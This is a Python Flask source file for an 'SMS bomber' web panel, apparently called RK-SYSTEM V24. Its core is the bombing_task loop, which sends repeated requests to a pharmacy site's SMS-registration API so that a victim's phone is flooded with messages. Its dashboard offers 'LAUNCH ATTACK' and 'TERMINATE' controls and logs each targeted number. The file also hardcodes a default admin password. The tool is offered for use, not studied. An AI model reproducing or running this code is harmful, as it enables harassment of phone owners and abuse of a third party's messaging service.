import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- [FEATURE: BST BD TIME ZONE] ----------
def get_bd_time():
    return datetime.now(timezone(timedelta(hours=6)))

# ---------- [DATABASE SETUP] ----------
def get_db():
    conn = sqlite3.connect('rk_v24_premium.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            # Default Admin: admin | Password: JaNiNaTo-330
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("JaNiNaTo-330"), "active"))
        except: pass

init_db()

# ---------- [CORE TURBO ENGINE] ----------
active_sessions = {}

def send_request(phone):
    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]
    try:
        res = requests.get(random.choice(api_list).format(phone), timeout=6)
        return res.status_code == 200
    except: return False

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    with ThreadPoolExecutor(max_workers=5) as executor:
        while key in active_sessions:
            curr = active_sessions[key]
            if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
            if curr['status'] == 'Running':
                now = get_bd_time()
                elapsed = now - start_dt
                active_sessions[key]['running_time'] = str(elapsed).split('.')[0]
                if executor.submit(send_request, phone).result():
                    active_sessions[key]['success'] += 1
                else: active_sessions[key]['fail'] += 1
                active_sessions[key]['total'] += 1
                if active_sessions[key]['total'] > 1:
                    avg = elapsed.total_seconds() / active_sessions[key]['total']
                    active_sessions[key]['eta'] = str(timedelta(seconds=int(avg * (limit - active_sessions[key]['total']))))
                time.sleep(0.15)
            else: time.sleep(1)

    stop_dt = get_bd_time()
    s = active_sessions.get(key)
    if s and s['status'] != 'Paused':
        with get_db() as conn:
            conn.execute("INSERT INTO history (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                (username, phone, s['success'], s['fail'], s['total'], limit, "Completed", s['start_time'], stop_dt.strftime("%I:%M %p"), s['running_time'], start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- [HACKER THEME PREMIUM UI] ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-V24 PREMIUM SYSTEM</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&family=Source+Code+Pro:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #020202; --card: #0a0a0a; --red: #ff003c; --blue: #00d2ff; --gold: #f39c12; --purple: #9b59b6; }
        * { box-sizing: border-box; }
        body { background: var(--bg); color: #e0e0e0; font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }
        
        /* DOOR ANIMATION (Only shown first time) */
        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; display: none; }
        .door { width: 50%; height: 100%; background: #000; position: absolute; transition: 1.5s cubic-bezier(0.7, 0, 0.3, 1); border: 1px solid var(--neon); }
        .left-door { left: 0; border-right: 2px solid var(--neon); }
        .right-door { right: 0; border-left: 2px solid var(--neon); }
        .loaded .left-door { transform: translateX(-100%); }
        .loaded .right-door { transform: translateX(100%); }
        .loaded #loader { visibility: hidden; pointer-events: none; }

        /* RGB BANNER */
        .rk-banner {
            max-width: 550px; margin: 20px auto; padding: 10px;
            background: #000; border: 2.5px solid var(--neon); border-radius: 15px;
            position: relative; overflow: hidden; text-align: center;
        }
        .rk-banner h1 {
            font-family: 'Orbitron'; font-weight: 900; font-size: 2.5rem; margin: 0;
            background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000);
            background-size: 400%; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            animation: flow 4s linear infinite; letter-spacing: 5px;
        }
        @keyframes flow { 0%{background-position:0% 50%} 100%{background-position:100% 50%} }

        #canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
        .nav { background: rgba(0,0,0,0.9); padding: 15px 25px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; backdrop-filter: blur(10px); }
        .logo { font-family: 'Orbitron'; font-weight: 900; color: var(--neon); text-shadow: 0 0 15px var(--neon); }
        
        .container { padding: 30px 15px; max-width: 550px; margin: auto; animation: zoomIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        @keyframes zoomIn { from { transform: scale(0.6); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        
        .monitor-frame { position: relative; background: #000; border-radius: 20px; padding: 2px; overflow: hidden; margin-bottom: 30px; }
        .monitor-frame::before { content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(transparent, var(--neon), var(--blue), var(--purple), var(--neon)); animation: rotate 4s linear infinite; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .monitor-content { position: relative; background: var(--card); border-radius: 18px; padding: 25px; z-index: 2; }

        input { width: 100%; padding: 16px; margin: 12px 0; background: rgba(0,0,0,0.5); border: 1px solid #222; color: var(--neon); border-radius: 12px; font-family: 'Source Code Pro'; font-size: 14px; outline: none; border-left: 4px solid var(--neon); }
        .btn-turbo { background: linear-gradient(135deg, var(--neon), var(--blue)); color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; }

        .three-dot { cursor: pointer; padding: 10px; }
        .dot { height: 5px; width: 5px; background: var(--neon); border-radius: 50%; display: block; margin: 4px; }
        .menu-dropdown { position: absolute; right: 20px; top: 75px; background: var(--card); border: 1px solid var(--neon); border-radius: 8px; width: 240px; display: none; z-index: 2000; }
        .menu-dropdown a { display: block; padding: 15px 20px; color: #fff; text-decoration: none; font-size: 10px; border-bottom: 1px solid #1a1a1a; }

        .btn-ctrl { padding: 10px; border-radius: 8px; border: none; font-family: 'Orbitron'; font-size: 10px; cursor: pointer; flex: 1; font-weight: bold; }
        .bg-pause { background: var(--gold); color: #000; }
        .bg-stop { background: var(--red); color: #fff; }
        .c-neon { color: var(--neon); } .c-blue { color: var(--blue); } .c-red { color: var(--red); } .c-gold { color: var(--gold); }
    </style>
</head>
<body onclick="document.getElementById('mBox').style.display='none'">
    <div id="loader">
        <div class="door left-door"></div>
        <div class="door right-door"></div>
        <audio id="hack_sound" src="https://www.soundjay.com/communication/typing-6-slow.mp3" preload="auto"></audio>
    </div>

    <canvas id="canvas"></canvas>
    <audio id="snd_start" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>
    
    <div class="rk-banner"><h1>RK-SYSTEM</h1></div>

    <nav class="nav">
        <div class="logo" onclick="location.href='/dashboard'">RK-SYSTEM V24</div>
        <div class="three-dot" onclick="event.stopPropagation(); let m=document.getElementById('mBox'); m.style.display=(m.style.display==='block'?'none':'block')">
            <span class="dot"></span><span class="dot"></span><span class="dot"></span>
        </div>
    </nav>

    <div class="menu-dropdown" id="mBox">
        <a href="/history">01. ALL HISTORY</a>
        <a href="/running-logs">02. RUNNING MISSIONS</a>
        <a href="/last-attack">03. LAST ATTACK</a>
        <a href="/profile">04. PROFILES</a>
        <a href="/logout" style="color:var(--red);">!! LOGOUT</a>
    </div>

    <div class="container">[CONTENT]</div>

    <script>
        // Check if first time loading
        if (!sessionStorage.getItem('animated')) {
            document.getElementById('loader').style.display = 'flex';
            const sound = document.getElementById('hack_sound');
            sound.play().catch(() => { /* Auto-play protection */ });
            
            setTimeout(() => {
                document.body.classList.add('loaded');
                sessionStorage.setItem('animated', 'true');
            }, 2000); // 2 Seconds
        }

        // MATRIX BACKGROUND
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        const fontSize = 14;
        const drops = Array(Math.floor(canvas.width/fontSize)).fill(1);
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ffcc'; ctx.font = fontSize + 'px Orbitron';
            for (let i = 0; i < drops.length; i++) {
                ctx.fillText(letters.charAt(Math.floor(Math.random()*letters.length)), i*fontSize, drops[i]*fontSize);
                if (drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 50);

        function sync() {
            let area = document.getElementById('live-engine'); if(!area) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k]; let p = (s.total/s.limit)*100;
                    html += `<div class="monitor-frame"><div class="monitor-content">
                        <div style="display:flex; justify-content:space-between; border-bottom:1px solid #222; padding-bottom:10px;">
                            <b class="c-blue">TARGET: ${s.phone}</b>
                            <span style="color:var(--neon); font-size:11px; font-weight:bold;">● ${s.status}</span>
                        </div>
                        <div style="height:8px; background:#111; border-radius:10px; margin:20px 0; overflow:hidden;">
                            <div style="height:100%; background:linear-gradient(90deg, var(--neon), var(--blue)); width:${p}%"></div>
                        </div>
                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; text-align:center;">
                            <div><span>SUCCESS</span><br><b class="c-neon">${s.success}</b></div>
                            <div><span>FAIL</span><br><b class="c-red">${s.fail}</b></div>
                        </div>
                        <div style="display:flex; gap:10px; margin-top:15px;">
                            <button class="btn-ctrl bg-pause" onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'">${s.status==='Running'?'PAUSE':'RESUME'}</button>
                            <button class="btn-ctrl bg-stop" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
                        </div>
                    </div></div>`;
                } area.innerHTML = html;
            });
        } setInterval(sync, 1500);
    </script>
</body></html>
'''

# ---------- [ROUTES] ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u; return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content" style="text-align:center;"><h3 class="c-neon">SYSTEM AUTH</h3><form method="POST"><input name="u" placeholder="Operator ID" required><input name="p" type="password" placeholder="Access Key" required><button class="btn-turbo">ENTER SYSTEM</button></form><p style="font-size:12px; margin-top:15px;">New Operator? <a href="/register" class="c-blue">Register</a></p></div></div>'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            try:
                conn.execute("INSERT INTO users VALUES (?, ?, ?)", (u, generate_password_hash(p), "active"))
                return redirect(url_for('login'))
            except: pass
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content" style="text-align:center;"><h3 class="c-blue">REGISTRATION</h3><form method="POST"><input name="u" placeholder="Set ID" required><input name="p" type="password" placeholder="Set Key" required><button class="btn-turbo">CREATE ACCOUNT</button></form><p style="font-size:12px; margin-top:15px;"><a href="/login" class="c-neon">Back to Login</a></p></div></div>'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content"><h3 class="c-neon">🚀 MISSION CONTROL</h3><form action="/api/start"><input name="num" type="tel" inputmode="numeric" placeholder="Phone Number" autocomplete="on" required><input name="amt" type="number" inputmode="numeric" placeholder="Hit Amount" required><button class="btn-turbo" onclick="document.getElementById(\'snd_start\').play()">LAUNCH ATTACK</button></form></div></div><div id="live-engine"></div>'))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn: logs = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as total_ok FROM history GROUP BY phone ORDER BY id DESC").fetchall()
    html = '<h3 class="c-blue">📂 DATABASE HISTORY</h3>'
    for l in logs:
        html += f'<div class="monitor-frame" onclick="location.href=\'/history/{l["phone"]}\'"><div class="monitor-content" style="cursor:pointer; display:flex; justify-content:space-between; align-items:center;"><div><b class="c-gold">{l["phone"]}</b><br><small>Sessions: {l["sessions"]}</small></div><b class="c-neon">{l["total_ok"]} OK</b></div></div>'
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/history/<num>')
def history_detail(num):
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn: logs = conn.execute("SELECT * FROM history WHERE phone=? ORDER BY id DESC", (num,)).fetchall()
    html = f'<h3>📜 LOGS: {num}</h3>'
    for l in logs:
        html += f'<div class="monitor-frame"><div class="monitor-content">DATE: {l["date_str"]} | SUCCESS: <b class="c-neon">{l["success"]}</b><br>STATUS: {l["status"]}</div></div>'
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = get_bd_time(); key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'running_time': '0:00:00', 'eta': 'Calculating...'}
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status(): return jsonify({k: v for k, v in active_sessions.items() if k.startswith(session.get('user', ''))})

@app.route('/api/control')
def api_control():
    key = f"{session['user']}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session['user']}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=54300)
